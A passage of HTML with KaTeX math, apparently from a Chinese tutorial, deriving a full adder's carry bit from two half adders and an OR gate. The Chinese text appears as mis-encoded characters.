style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">))</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">=(\neg{a}\land b\land c)\lor(a\land \neg{b}\land c)\lor(a\land b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mi mathvariant="normal">Â¬</mi><mi>a</mi><mo>âˆ§</mo><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âˆ§</mo><mi mathvariant="normal">Â¬</mi><mi>b</mi><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">=(\neg{a}\land b\land c)\lor(a\land \neg{b}\land c)\lor carry_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">a</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord">Â¬</span><span class="mord"><span class="mord mathnormal">b</span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi><mo stretchy="false">)</mo><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">=((a\oplus b)\land c)\lor carry_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">((</span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mo>=</mo><mo stretchy="false">(</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">=(sum_{ha}\land c)\lor carry_{ha}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.3669em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>è€ƒè™‘åˆ° <code>HalfAdder</code> çš„ä½œç”¨å°±æ˜¯å¯¹è¾“å…¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span></span></span></span></span> åˆ†åˆ«æ‰§è¡Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âŠ•</mo></mrow><annotation encoding="application/x-tex">\oplus</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord">âŠ•</span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ§</mo></mrow><annotation encoding="application/x-tex">\land</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord">âˆ§</span></span></span></span></span> è¿ç®—ï¼Œæ‰€ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub></mrow><annotation encoding="application/x-tex">carry_{fa}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å¯ä»¥é€šè¿‡æ‹¼æ¥ä¸¤ä¸ª <code>HalfAdder</code> <strong>å†åŠ ä¸Šä¸€ä¸ª <code>Or</code> è¿ç®—</strong> æ¥å®ç° â¬‡ï¸</p>
<ul>
<li>ç¬¬ä¸€ä¸ª <code>HalfAdder</code> ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo separator="true">,</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">a,b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"/><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal">b</span></span></span></span></span> ä¸ºè¾“å…¥ï¼Œå®ƒçš„
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>=</mo><mi>a</mi><mo>âŠ•</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">sum_{fa1}=a\oplus b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>=</mo><mi>a</mi><mo>âˆ§</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">carry_{ha1}=a\land b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.5556em;"/><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord mathnormal">b</span></span></span></span></span></li>
</ul>
</li>
<li>ç¬¬äºŒä¸ª <code>HalfAdder</code> ä»¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">sum_{fa1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span> å’Œ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi></mrow><annotation encoding="application/x-tex">c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span> ä¸ºè¾“å…¥ï¼Œå®ƒçš„
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi><mn>2</mn></mrow></msub><mo>=</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>âŠ•</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">sum_{ha2}=sum_{fa1}\oplus c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8694em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âŠ•</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi><mn>2</mn></mrow></msub><mo>=</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>f</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>âˆ§</mo><mi>c</mi></mrow><annotation encoding="application/x-tex">carry_{ha2}=sum_{fa1}\land c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8417em;vertical-align:-0.2861em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">c</span></span></span></span></span></li>
</ul>
</li>
</ul>
<p>é‚£ä¹ˆ</p>
<div class="math math-display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>f</mi><mi>a</mi></mrow></msub><mo>=</mo><mo stretchy="false">(</mo><mi>s</mi><mi>u</mi><msub><mi>m</mi><mrow><mi>h</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>âˆ§</mo><mi>c</mi><mo stretchy="false">)</mo><mo>âˆ¨</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi><mn>1</mn></mrow></msub><mo>=</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi><mn>2</mn></mrow></msub><mo>âˆ¨</mo><mi>c</mi><mi>a</mi><mi>r</mi><mi>r</mi><msub><mi>y</mi><mrow><mi>h</mi><mi>a</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">carry_{fa}=(sum_{ha1}\land c)\lor carry_{ha1}=carry_{ha2}\lor carry_{ha1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mord mathnormal">u</span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ§</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">c</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.75em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ¨</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"/><span class="mord mathnormal">c</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">rr</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ha</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span 